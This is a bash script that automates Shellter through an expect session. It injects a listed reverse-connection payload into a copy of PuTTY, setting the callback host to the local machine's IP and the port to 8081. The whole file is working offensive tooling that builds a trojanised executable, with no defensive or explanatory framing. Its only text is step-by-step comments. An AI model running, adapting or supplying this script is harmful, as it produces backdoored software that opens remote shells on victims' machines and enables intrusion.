#!/usr/bin/env bash

# Define the local host IP dynamically or set it statically
LHOST=$(ip route get 1 | awk '{print $7; exit}')  # Dynamically find the local IP

# Navigate to the directory containing shellter.exe
cd /opt/shellter/

# Start the expect script to automate interaction with shellter
/usr/bin/expect <<EOF
# Launch shellter with wine
spawn wine shellter.exe

# Wait for the operation mode prompt and choose Auto
expect "Choose Operation Mode - Auto/Manual (A/M/H):"
send "A\r"

# Wait for the PE Target prompt and specify the target executable
expect "PE Target:"
send "/opt/putty.exe\r"

# Correct handling of the Enter key
expect "Press \[Enter\] to continue..."
send "\r"

# Wait for the stealth mode prompt and choose No
expect "Enable Stealth Mode? (Y/N/H):"
send "N\r"

# Choose listed payload
expect "listed or custom payload"
send "L\r"

# Select payload #3
expect "Select payload number:"
send "3\r"

# Set LHOST and LPORT
expect "SET LHOST:"
send "${LHOST}\r"
expect "SET LPORT:"
send "8081\r"

# Wait for Injection verification and print success message
expect "Injection: Verified!"
send_user "Injection Verified!\r"

# Correct handling of the Enter key
expect "Press \[Enter\] to continue..."
send "\r"

# Ensure the script waits for Shellter to finish
expect eof
EOF

# Return to the original directory or continue with further commands
